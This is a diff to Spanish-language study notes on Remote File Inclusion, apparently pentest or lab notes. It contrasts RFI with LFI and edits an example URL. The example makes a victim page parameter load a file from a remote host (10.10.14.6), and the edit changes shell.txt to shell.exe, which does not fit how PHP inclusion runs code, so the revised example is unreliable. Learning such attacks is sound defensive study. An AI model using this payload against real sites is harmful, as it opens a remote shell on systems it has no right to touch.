@@ -1,4 +1,5 @@
-Es muy parecido al [[LFI(Local File Inclusion)]] nada mas que envés de listar archivos a nivel local, vamos a descargar y ejecutar archivos ubicados en servidores remotos, que tengan un contenido malisioso
+Es muy parecido al [[LFI(Local File Inclusion)]] nada mas que envés de listar archivos a nivel local
+En RFI los vamos a ejecutar los archivos
 
 ------
 ### 📍 ¿Dónde suele encontrarse?
@@ -24,6 +25,6 @@ http://victima.com/index.php?page=home.php
 ## 🧪 Ejemplo práctico
 
 ```
-http://victima.com/index.php?page=http://10.10.14.6/shell.txt
+http://victima.com/index.php?page=http://10.10.14.6/shell.exe
 ```
-Se descarga y se ejecuta en este caso el archivo shell.txt
+Ejecutamos el archivo
